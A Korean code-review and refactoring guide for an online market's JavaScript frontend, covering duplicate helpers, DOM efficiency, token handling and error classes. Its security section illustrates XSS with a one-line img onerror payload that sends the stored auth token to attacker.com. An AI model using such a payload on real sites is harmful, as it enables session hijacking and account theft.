# HODU MARKET 함수 최적화 가이드

**작성일**: 2026-01-16
**분석 범위**: main.js 파일 10개, js 폴더 파일 13개

---

## 목차
1. [중복 함수 통합](#1-중복-함수-통합)
2. [비효율적인 함수 개선](#2-비효율적인-함수-개선)
3. [사용되지 않는 함수 제거](#3-사용되지-않는-함수-제거)
4. [토큰/인증 처리 개선](#4-토큰인증-처리-개선)
5. [API 호출 최적화](#5-api-호출-최적화)
6. [에러 처리 패턴 개선](#6-에러-처리-패턴-개선)
7. [우선순위별 작업 목록](#7-우선순위별-작업-목록)

---

## 1. 중복 함수 통합

### 1.1 formatPrice() 함수 중복 (3개 파일)

**발견 위치:**
| 파일 | 라인 | 구현 방식 |
|------|------|----------|
| `src/main.js` | 48-50 | `price.toLocaleString('ko-KR')` |
| `src/pages/productDetail/main.js` | 30-32 | 동일 |
| `src/pages/mypage/main.js` | 147-151 | NaN 체크 포함 |

**현재 코드:**
```javascript
// src/main.js (라인 48-50)
function formatPrice(price) {
  return price.toLocaleString('ko-KR')
}

// src/pages/mypage/main.js (라인 147-151) - 더 안전한 버전
function formatPrice(value) {
  const numberValue = Number.parseInt(value, 10)
  if (Number.isNaN(numberValue)) return '0'
  return numberValue.toLocaleString('ko-KR')
}
```

**개선 방안:**
```javascript
// src/js/utils/format.js (새 파일 생성)
export const formatPrice = (value) => {
  const numberValue = typeof value === 'number' ? value : Number.parseInt(value, 10)
  if (Number.isNaN(numberValue)) return '0'
  return numberValue.toLocaleString('ko-KR')
}

export const formatPriceWithUnit = (value, unit = '원') => {
  return `${formatPrice(value)}${unit}`
}
```

**수정할 파일:**
- `src/main.js` - import 추가, 로컬 함수 삭제
- `src/pages/productDetail/main.js` - import 추가, 로컬 함수 삭제
- `src/pages/mypage/main.js` - import 추가, 로컬 함수 삭제
- `src/pages/Payment/main.js` - getNumber() 함수도 통합 가능

---

### 1.2 showValidation() 함수 중복 (2개 파일)

**발견 위치:**
| 파일 | 라인 | 비고 |
|------|------|------|
| `src/js/auth/login.js` | 105-121 | 완전 동일 |
| `src/js/auth/signup.js` | 202-218 | 완전 동일 |

**현재 코드:**
```javascript
// login.js & signup.js (동일)
export const showValidation = (message, isError = true) => {
  const validationElement = document.querySelector('.validation-message')

  if (validationElement) {
    validationElement.textContent = message
    validationElement.style.display = 'block'
    validationElement.style.color = isError ? 'red' : 'green'
  } else {
    if (isError) {
      console.error(message)
    } else {
      console.log(message)
    }
  }
}
```

**개선 방안:**
```javascript
// src/js/utils/validation.js (새 파일 생성)
export const showValidation = (message, isError = true) => {
  const validationElement = document.querySelector('.validation-message')

  if (validationElement) {
    validationElement.textContent = message
    validationElement.style.display = message ? 'block' : 'none'
    validationElement.style.color = isError ? 'var(--input-error-color)' : 'var(--input-success-color)'
  } else if (message) {
    console[isError ? 'error' : 'log'](message)
  }
}

export const hideValidation = () => {
  const validationElement = document.querySelector('.validation-message')
  if (validationElement) {
    validationElement.style.display = 'none'
  }
}
```

**수정할 파일:**
- `src/js/auth/login.js` - import 추가, 로컬 함수 삭제
- `src/js/auth/signup.js` - import 추가, 로컬 함수 삭제

---

### 1.3 토큰 검증 로직 중복 (4개 파일)

**발견 위치:**
| 파일 | 라인 | 코드 |
|------|------|------|
| `src/js/cart/addToCart.js` | 5-9 | `if (!token) throw new Error('로그인이 필요합니다.')` |
| `src/js/seller/postSetProduct.js` | 11-15 | 동일 |
| `src/js/seller/updateSellerProduct.js` | 12-15 | 동일 |
| `src/js/seller/deleteSellerProduct.js` | 11-14 | 동일 |

**현재 코드:**
```javascript
// 모든 파일에서 반복
const token = getAccessToken()
if (!token) {
  throw new Error('로그인이 필요합니다.')
}
```

**개선 방안:**
```javascript
// src/js/auth/token.js에 추가
export const requireToken = () => {
  const token = getAccessToken()
  if (!token) {
    throw new Error('로그인이 필요합니다.')
  }
  return token
}

// 사용 예 (addToCart.js)
import { requireToken } from '../auth/token.js'

export const addToCart = async (productId, quantity) => {
  const token = requireToken()  // 한 줄로 간소화
  // ...
}
```

---

### 1.4 JWT 파싱 로직 중복 (token.js 내부)

**발견 위치:**
- `src/js/auth/token.js` 라인 34-48 (getUsername)
- `src/js/auth/token.js` 라인 50-61 (getUserId)

**현재 코드:**
```javascript
// getUsername() - 라인 43-45
const payload = JSON.parse(atob(token.split('.')[1]))
return payload?.username ?? null

// getUserId() - 라인 56-58 (동일한 파싱 로직)
const payload = JSON.parse(atob(token.split('.')[1]))
return payload?.user_id ?? null
```

**개선 방안:**
```javascript
// 캐싱된 파싱 함수 추가
let cachedPayload = null
let cachedToken = null

const getTokenPayload = (token) => {
  if (cachedToken === token && cachedPayload) {
    return cachedPayload
  }

  if (!token) return null

  try {
    const payload = JSON.parse(atob(token.split('.')[1]))
    cachedToken = token
    cachedPayload = payload
    return payload
  } catch {
    return null
  }
}

export const getUsername = () => {
  const stored = localStorage.getItem(USERNAME_KEY)
  if (stored) return stored

  const token = getAccessToken()
  return getTokenPayload(token)?.username ?? null
}

export const getUserId = () => {
  const token = getAccessToken()
  return getTokenPayload(token)?.user_id ?? null
}

// 추가 유틸리티
export const getUserType = () => {
  const stored = localStorage.getItem(USER_TYPE_KEY)
  if (stored) return stored

  const token = getAccessToken()
  return getTokenPayload(token)?.user_type ?? null
}
```

---

## 2. 비효율적인 함수 개선

### 2.1 불필요한 중간 변수 (src/main.js)

**위치:** `src/main.js` 라인 79-93

**현재 코드:**
```javascript
// 불필요한 임시 변수
const productName = product.name
const productPrice = product.price

slide.innerHTML = `
  <div class="slide-info">
    <h3 class="slide-product-name">${productName}</h3>
    <p class="slide-price">${formatPrice(productPrice)}원</p>
  </div>
  ...
`
```

**개선 코드:**
```javascript
slide.innerHTML = `
  <div class="slide-info">
    <h3 class="slide-product-name">${product.name}</h3>
    <p class="slide-price">${formatPrice(product.price)}원</p>
  </div>
  ...
`
```

---

### 2.2 DOM 순회 중복 - showSlide() (src/main.js)

**위치:** `src/main.js` 라인 157-177

**현재 코드:**
```javascript
function showSlide(index) {
  // 두 번의 forEach로 동일한 작업 반복
  slides.forEach(function (slide, i) {
    if (i === index) {
      slide.classList.add('active')
    } else {
      slide.classList.remove('active')
    }
  })

  indicators.forEach(function (indicator, i) {
    if (i === index) {
      indicator.classList.add('active')
    } else {
      indicator.classList.remove('active')
    }
  })
}
```

**개선 코드:**
```javascript
const updateActive = (elements, activeIndex) => {
  elements.forEach((el, i) => {
    el.classList.toggle('active', i === activeIndex)
  })
}

function showSlide(index) {
  updateActive(slides, index)
  updateActive(indicators, index)
}
```

---

### 2.3 setInterval 폴링 - activateCartIcon() (shoppingCartPage/main.js)

**위치:** `src/pages/shoppingCartPage/main.js` 라인 397-435

**현재 코드:**
```javascript
function activateCartIcon() {
  // 100ms마다 폴링 (최악의 경우 50번 순회)
  const checkHeader = setInterval(() => {
    const cartLink = document.querySelector('.cart-link')
    if (cartLink) {
      // ... 많은 DOM 조작
      clearInterval(checkHeader)
    }
  }, 100)

  setTimeout(() => clearInterval(checkHeader), 5000)
}
```

**개선 코드:**
```javascript
// Promise 기반 요소 대기 함수
const waitForElement = async (selector, maxAttempts = 10, interval = 100) => {
  for (let i = 0; i < maxAttempts; i++) {
    const el = document.querySelector(selector)
    if (el) return el
    await new Promise(resolve => setTimeout(resolve, interval))
  }
  return null
}

async function activateCartIcon() {
  const cartLink = await waitForElement('.cart-link')
  if (!cartLink) return

  cartLink.classList.add('active')
  // ... 나머지 DOM 조작
}
```

---

### 2.4 이벤트 리스너 cloneNode 재등록 (shoppingCartPage/main.js)

**위치:** `src/pages/shoppingCartPage/main.js` 라인 225-253

**현재 코드:**
```javascript
function setupSelectAllCheckbox() {
  const selectAllCheckbox = document.getElementById('select-all')

  // cloneNode로 교체 - 매우 비효율적
  const newCheckbox = selectAllCheckbox.cloneNode(true)
  selectAllCheckbox.parentNode.replaceChild(newCheckbox, selectAllCheckbox)

  newCheckbox.addEventListener('change', (e) => { ... })
}
```

**개선 코드:**
```javascript
// 방법 1: 플래그 사용
function setupSelectAllCheckbox() {
  const selectAllCheckbox = document.getElementById('select-all')
  if (!selectAllCheckbox || selectAllCheckbox._hasListener) return

  selectAllCheckbox.addEventListener('change', handleSelectAll)
  selectAllCheckbox._hasListener = true
}

// 방법 2: AbortController 사용 (더 깔끔)
let selectAllController = null

function setupSelectAllCheckbox() {
  const selectAllCheckbox = document.getElementById('select-all')
  if (!selectAllCheckbox) return

  // 기존 리스너 제거
  selectAllController?.abort()
  selectAllController = new AbortController()

  selectAllCheckbox.addEventListener('change', handleSelectAll, {
    signal: selectAllController.signal
  })
}
```

---

### 2.5 반복되는 DOM 쿼리 (Payment/main.js)

**위치:** `src/pages/Payment/main.js` 라인 126-144

**현재 코드:**
```javascript
function updateFinalPaymentInfo(productAmount, totalShipping, totalDiscount) {
  // 매번 document.querySelector 호출
  const productAmountEl = document.querySelector('.payment-detail-row:nth-child(1) .detail-amount')
  if (productAmountEl) productAmountEl.textContent = productAmount.toLocaleString('ko-KR')

  const discountAmountEl = document.querySelector('.payment-detail-row:nth-child(2) .detail-amount')
  if (discountAmountEl) discountAmountEl.textContent = totalDiscount.toLocaleString('ko-KR')

  const shippingAmountEl = document.querySelector('.payment-detail-row:nth-child(3) .detail-amount')
  if (shippingAmountEl) shippingAmountEl.textContent = totalShipping.toLocaleString('ko-KR')
  // ...
}
```

**개선 코드:**
```javascript
// DOM 요소 캐싱
const paymentElements = {
  product: null,
  discount: null,
  shipping: null,
  final: null,
  initialized: false
}

function initPaymentElements() {
  if (paymentElements.initialized) return

  paymentElements.product = document.querySelector('.payment-detail-row:nth-child(1) .detail-amount')
  paymentElements.discount = document.querySelector('.payment-detail-row:nth-child(2) .detail-amount')
  paymentElements.shipping = document.querySelector('.payment-detail-row:nth-child(3) .detail-amount')
  paymentElements.final = document.querySelector('.final-amount')
  paymentElements.initialized = true
}

function updateFinalPaymentInfo(productAmount, totalShipping, totalDiscount) {
  initPaymentElements()

  const { product, discount, shipping, final } = paymentElements
  const total = productAmount + totalShipping - totalDiscount

  if (product) product.textContent = productAmount.toLocaleString('ko-KR')
  if (discount) discount.textContent = totalDiscount.toLocaleString('ko-KR')
  if (shipping) shipping.textContent = totalShipping.toLocaleString('ko-KR')
  if (final) final.textContent = `${total.toLocaleString('ko-KR')}원`
}
```

---

### 2.6 조건부 체크 반복 - updateCartItemData() (shoppingCartPage/main.js)

**위치:** `src/pages/shoppingCartPage/main.js` 라인 104-140

**현재 코드:**
```javascript
function updateCartItemData(cartItem, item) {
  const image = cartItem.querySelector('.cart-product-image')
  if (image) image.src = item.image

  const seller = cartItem.querySelector('.cart-seller')
  if (seller) seller.textContent = item.seller

  const productName = cartItem.querySelector('.cart-product-name')
  if (productName) productName.textContent = item.productName

  const price = cartItem.querySelector('.cart-product-price')
  if (price) price.textContent = `${item.price.toLocaleString('ko-KR')}원`
  // ... 계속 반복
}
```

**개선 코드:**
```javascript
function updateCartItemData(cartItem, item) {
  const updates = [
    { selector: '.cart-product-image', prop: 'src', value: item.image },
    { selector: '.cart-seller', prop: 'textContent', value: item.seller },
    { selector: '.cart-product-name', prop: 'textContent', value: item.productName },
    { selector: '.cart-product-price', prop: 'textContent', value: `${item.price.toLocaleString('ko-KR')}원` },
    { selector: '.cart-shipping-info', prop: 'textContent', value: item.shippingMethod },
    { selector: '.cart-shipping-fee', prop: 'textContent', value: item.shippingFee }
  ]

  updates.forEach(({ selector, prop, value }) => {
    const el = cartItem.querySelector(selector)
    if (el && value !== undefined) el[prop] = value
  })
}
```

---

### 2.7 God Function 분리 - setupCartItemEvents() (shoppingCartPage/main.js)

**위치:** `src/pages/shoppingCartPage/main.js` 라인 152-222 (200+ 라인)

**현재 문제:** 하나의 함수에서 6개 이벤트 타입 처리

**개선 방안:**
```javascript
// 이벤트 핸들러 분리
const cartEventHandlers = {
  quantity: (item, cartItem) => {
    cartItem.addEventListener('quantity-change', async (e) => {
      item.quantity = e.detail.quantity
      updateItemTotalPrice(cartItem, item)
      calculateTotalPrice()
      await updateCartItemQuantity(item.id, e.detail.quantity, item.productId)
    })
  },

  delete: (item, cartItem) => {
    const deleteBtn = cartItem.querySelector('.cart-delete-btn')
    deleteBtn?.addEventListener('click', () => showDeleteModal(item, cartItem))
  },

  checkbox: (item, cartItem) => {
    const checkbox = cartItem.querySelector('.cart-checkbox-input')
    checkbox?.addEventListener('change', () => {
      calculateTotalPrice()
      updateSelectAllCheckbox()
    })
  },

  order: (item, cartItem) => {
    const orderBtn = cartItem.querySelector('.order-btn')
    orderBtn?.addEventListener('click', () => orderSingleItem(item))
  }
}

function setupCartItemEvents(cartItem, item) {
  Object.values(cartEventHandlers).forEach(handler => handler(item, cartItem))
}
```

---

## 3. 사용되지 않는 함수 제거

### 3.1 디버그용 console.log (productDetail/main.js)

**위치:** `src/pages/productDetail/main.js` 라인 94, 97, 101, 104

**현재 코드:**
```javascript
function renderProductDetail(product) {
  console.log('???')       // 라인 94 - 의미없음
  console.log(isSellerUser())  // 라인 97 - 디버그용
  console.log('isSeller')   // 라인 101 - 의미없음
  console.log('!!!')        // 라인 104 - 의미없음
}
```

**개선:** 모든 디버그 console.log 제거

---

### 3.2 loginType 파라미터 미사용 (login.js)

**위치:** `src/js/auth/login.js` 라인 67, 85

**현재 코드:**
```javascript
export const handleLoginSubmit = (formElement, loginType = 'BUYER') => {
  // loginType이 전달되지만...
  await login(username, password, loginType)
}

// login 함수에서는 loginType을 받지 않음
export const login = async (username, password) => {
  // loginType 파라미터 없음!
}
```

**개선 방안:**
```javascript
// 방법 1: loginType 활용
export const login = async (username, password, loginType = 'BUYER') => {
  const endpoint = loginType === 'SELLER'
    ? 'accounts/seller/login/'
    : 'accounts/login/'
  // ...
}

// 방법 2: 불필요하면 제거
export const handleLoginSubmit = (formElement) => {
  // loginType 파라미터 제거
}
```

---

### 3.3 잘못된 에러 메시지 (getproduct.js)

**위치:** `src/js/product/getproduct.js` 라인 9-10

**현재 코드:**
```javascript
export const getproduct = async () => {
  try {
    const data = await getRequest('products/')
    return data
  } catch (error) {
    console.error('로그인 실패:', error)  // 잘못된 메시지!
    throw error
  }
}
```

**개선:**
```javascript
console.error('상품 목록 조회 실패:', error)
```

---

## 4. 토큰/인증 처리 개선

### 4.1 현재 localStorage 사용 현황

| 키 | 용도 | 보안 위험 |
|----|------|----------|
| `auth_token` | Access Token | XSS 취약 |
| `refresh_token` | Refresh Token | XSS 취약 |
| `user_type` | 사용자 타입 | 중간 |
| `username` | 사용자명 | 낮음 |

### 4.2 보안 문제점

#### 문제 1: XSS 취약점
```javascript
// 공격 시나리오
<img src=x onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'))">
```

#### 문제 2: 분산된 localStorage 접근
- `src/component/header/search.js`: 직접 접근 (`localStorage.getItem('refresh_token')`)
- `src/component/etc/mypage.js`: 직접 삭제
- 중앙화된 함수 미사용

#### 문제 3: 로그아웃 시 불완전 정리
```javascript
// src/component/etc/mypage.js (라인 58-60)
handleLogout() {
  localStorage.removeItem('auth_token')
  localStorage.removeItem('refresh_token')
  localStorage.removeItem('user_type')
  // username을 삭제하지 않음!
}
```

### 4.3 개선 방안 1: 중앙화된 인증 스토어

```javascript
// src/js/auth/authStore.js (새 파일)
class AuthStore {
  constructor() {
    this.listeners = []
    this.state = {
      accessToken: null,
      refreshToken: null,
      username: null,
      userType: null,
      isAuthenticated: false,
    }
    this.restore()  // localStorage에서 복원
  }

  restore() {
    const backup = localStorage.getItem('auth_backup')
    if (backup) {
      try {
        const data = JSON.parse(backup)
        this.state = { ...this.state, ...data, isAuthenticated: !!data.accessToken }
      } catch (e) {
        console.error('인증 정보 복원 실패')
      }
    }
  }

  setState(newState) {
    this.state = { ...this.state, ...newState }
    this.persist()
    this.notify()
  }

  persist() {
    localStorage.setItem('auth_backup', JSON.stringify({
      accessToken: this.state.accessToken,
      refreshToken: this.state.refreshToken,
      username: this.state.username,
      userType: this.state.userType,
    }))
  }

  subscribe(listener) {
    this.listeners.push(listener)
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener)
    }
  }

  notify() {
    this.listeners.forEach(listener => listener(this.state))
  }

  login(accessToken, refreshToken, username, userType) {
    this.setState({
      accessToken,
      refreshToken,
      username,
      userType,
      isAuthenticated: true,
    })
  }

  logout() {
    this.setState({
      accessToken: null,
      refreshToken: null,
      username: null,
      userType: null,
      isAuthenticated: false,
    })
    localStorage.removeItem('auth_backup')
    sessionStorage.clear()
  }

  getAccessToken() { return this.state.accessToken }
  getRefreshToken() { return this.state.refreshToken }
  getUsername() { return this.state.username }
  getUserType() { return this.state.userType }
  isAuthenticated() { return this.state.isAuthenticated }
}

export const authStore = new AuthStore()
```

### 4.4 개선 방안 2: 401 에러 시 자동 토큰 갱신

```javascript
// src/js/api.js 수정
import { authStore } from './auth/authStore.js'

const handleResponse = async (response, originalRequest) => {
  if (response.status === 401) {
    try {
      // 토큰 갱신 시도
      const newToken = await refreshAccessToken()

      // 원래 요청 재시도
      const retryResponse = await fetch(originalRequest.url, {
        ...originalRequest,
        headers: {
          ...originalRequest.headers,
          Authorization: `Bearer ${newToken}`,
        },
      })
      return handleResponse(retryResponse, null)  // 재귀 방지
    } catch (error) {
      // 갱신 실패 시 로그아웃
      authStore.logout()
      window.location.href = '/src/pages/login/'
      throw new Error('세션이 만료되었습니다.')
    }
  }

  // 기존 처리...
}
```

### 4.5 개선 방안 3: HttpOnly 쿠키 (백엔드 필요)

**장점:**
- JavaScript에서 접근 불가 (XSS 방어)
- 가장 안전한 방법

**프론트엔드 변경:**
```javascript
// 토큰을 명시적으로 포함할 필요 없음
export const getAuthRequest = async (endpoint) => {
  const response = await fetch(`${API_BASE_URL}${endpoint}`, {
    method: 'GET',
    credentials: 'include',  // 쿠키 자동 포함
    headers: {
      'Content-Type': 'application/json',
    },
  })
  return await handleResponse(response)
}
```

**백엔드 변경 필요 (Django 예시):**
```python
response.set_cookie(
    'access_token',
    token,
    httponly=True,
    secure=True,
    samesite='Strict',
    max_age=3600
)
```

---

## 5. API 호출 최적화

### 5.1 상품 목록 캐싱 (getproduct.js)

**현재 문제:** 매번 API 호출

```javascript
// 현재 코드
export const getproduct = async () => {
  const data = await getRequest('products/')  // 매번 호출
  return data
}
```

**개선 코드:**
```javascript
let productCache = null
let cacheTimestamp = null
const CACHE_DURATION = 5 * 60 * 1000  // 5분

export const getproduct = async (forceRefresh = false) => {
  // 캐시가 유효하면 반환
  if (!forceRefresh && productCache &&
      Date.now() - cacheTimestamp < CACHE_DURATION) {
    return productCache
  }

  try {
    const data = await getRequest('products/')
    productCache = data
    cacheTimestamp = Date.now()
    return data
  } catch (error) {
    console.error('상품 목록 조회 실패:', error)
    throw error
  }
}

// 캐시 무효화 함수
export const invalidateProductCache = () => {
  productCache = null
  cacheTimestamp = null
}
```

### 5.2 클라이언트 필터링 제거 (getSellerProducts.js)

**현재 문제:** 전체 상품 로드 후 클라이언트에서 필터링

```javascript
// 현재 코드
const data = await getAuthRequest('products/', token)
const filtered = results.filter(
  (product) => product?.seller?.username === sellerName
)
```

**개선 방안:**
```javascript
// 백엔드 API가 지원한다면
const data = await getAuthRequest(`products/?seller=${sellerName}`, token)

// 또는 전용 엔드포인트 사용
const data = await getAuthRequest('seller/my-products/', token)
```

### 5.3 addToCart.js - api.js 함수 활용

**현재 문제:** 직접 fetch 호출 (api.js의 함수 미사용)

```javascript
// 현재 코드 (addToCart.js)
const response = await fetch(`${API_BASE_URL}cart/`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${token}`,
  },
  body: JSON.stringify({ product_id: productId, quantity }),
})
```

**개선 코드:**
```javascript
import { postAuthRequest } from '../api.js'
import { requireToken } from '../auth/token.js'

export const addToCart = async (productId, quantity) => {
  const token = requireToken()

  try {
    return await postAuthRequest('cart/', {
      product_id: productId,
      quantity
    }, token)
  } catch (error) {
    // 에러 타입 추가
    if (error.status === 409) {
      error.isDuplicate = true
    }
    if (error.status === 400 && error.message.includes('재고')) {
      error.isStockExceeded = true
    }
    throw error
  }
}
```

---

## 6. 에러 처리 패턴 개선

### 6.1 에러 클래스 정의

```javascript
// src/js/utils/errors.js (새 파일)
export class AppError extends Error {
  constructor(message, status, data) {
    super(message)
    this.name = 'AppError'
    this.status = status
    this.data = data
  }
}

export class NetworkError extends AppError {
  constructor(message = '네트워크 연결을 확인해주세요.') {
    super(message, 0, null)
    this.name = 'NetworkError'
    this.isNetworkError = true
  }
}

export class AuthError extends AppError {
  constructor(message = '인증이 필요합니다.') {
    super(message, 401, null)
    this.name = 'AuthError'
    this.isAuthError = true
  }
}

export class ValidationError extends AppError {
  constructor(message, fieldErrors) {
    super(message, 400, fieldErrors)
    this.name = 'ValidationError'
    this.fieldErrors = fieldErrors
  }
}

export class DuplicateError extends AppError {
  constructor(message = '이미 존재하는 항목입니다.') {
    super(message, 409, null)
    this.name = 'DuplicateError'
    this.isDuplicate = true
  }
}
```

### 6.2 api.js 에러 처리 개선

```javascript
// src/js/api.js
import { NetworkError, AuthError, ValidationError } from './utils/errors.js'

const handleResponse = async (response) => {
  if (response.status === 204) {
    return { success: true }
  }

  const text = await response.text()
  const data = text ? JSON.parse(text) : {}

  if (response.ok) {
    return data
  }

  // 상태별 에러 처리
  switch (response.status) {
    case 401:
      throw new AuthError(data.message || '인증이 필요합니다.')
    case 400:
      throw new ValidationError(data.message || '입력값을 확인해주세요.', data)
    case 409:
      throw new DuplicateError(data.message)
    default:
      const error = new Error(data.message || '요청 처리 중 오류가 발생했습니다.')
      error.status = response.status
      error.data = data
      throw error
  }
}

export const getRequest = async (endpoint) => {
  try {
    const response = await fetch(`${API_BASE_URL}${endpoint}`, {
      method: 'GET',
      headers: { 'Content-Type': 'application/json' },
    })
    return await handleResponse(response)
  } catch (error) {
    if (error instanceof TypeError && error.message.includes('fetch')) {
      throw new NetworkError()
    }
    throw error
  }
}
```

---

## 7. 우선순위별 작업 목록

### 높음 (즉시 처리)

| 항목 | 파일 | 예상 효과 |
|------|------|----------|
| formatPrice() 통합 | 3개 파일 | 코드 중복 -30줄 |
| showValidation() 통합 | 2개 파일 | 코드 중복 -30줄 |
| requireToken() 추가 | token.js | 중복 제거 |
| JWT 파싱 캐싱 | token.js | 성능 향상 |
| console.log 제거 | productDetail | 코드 정리 |
| 에러 메시지 수정 | getproduct.js | 디버깅 개선 |

### 중간 (단기)

| 항목 | 파일 | 예상 효과 |
|------|------|----------|
| DOM 요소 캐싱 | Payment/main.js | 성능 향상 |
| 이벤트 리스너 개선 | shoppingCartPage | 메모리 누수 방지 |
| setInterval → Promise | shoppingCartPage | 효율성 개선 |
| God Function 분리 | shoppingCartPage | 가독성 향상 |
| addToCart → api.js 사용 | addToCart.js | 일관성 |

### 낮음 (중기)

| 항목 | 파일 | 예상 효과 |
|------|------|----------|
| AuthStore 도입 | 새 파일 | 상태 관리 중앙화 |
| 401 자동 갱신 | api.js | UX 개선 |
| 에러 클래스 도입 | 새 파일 | 에러 처리 개선 |
| 상품 캐싱 | getproduct.js | API 호출 감소 |
| HttpOnly 쿠키 | 백엔드 필요 | 보안 강화 |

---

## 8. 생성할 유틸리티 파일

```
src/js/utils/
  ├── format.js         // formatPrice, formatDate 등
  ├── validation.js     // showValidation, hideValidation
  ├── errors.js         // 커스텀 에러 클래스
  └── dom.js            // waitForElement, DOM 캐싱 유틸
```

---

## 체크리스트

### 중복 함수 통합
- [ ] formatPrice() → src/js/utils/format.js
- [ ] showValidation() → src/js/utils/validation.js
- [ ] requireToken() → src/js/auth/token.js
- [ ] getTokenPayload() 캐싱 → src/js/auth/token.js

### 비효율적 함수 개선
- [ ] showSlide() 리팩토링 → src/main.js
- [ ] activateCartIcon() Promise 전환 → shoppingCartPage/main.js
- [ ] setupSelectAllCheckbox() 이벤트 처리 개선
- [ ] updateFinalPaymentInfo() DOM 캐싱
- [ ] updateCartItemData() 루프 처리
- [ ] setupCartItemEvents() 분리

### 코드 정리
- [ ] 디버그 console.log 제거
- [ ] 에러 메시지 수정
- [ ] loginType 파라미터 정리

### 토큰/인증
- [ ] 로그아웃 시 완전 정리
- [ ] 401 자동 갱신 구현
- [ ] AuthStore 도입 (선택)

---

**작성자**: Claude AI
**검토 기준**: 코드 효율성, 유지보수성, 보안
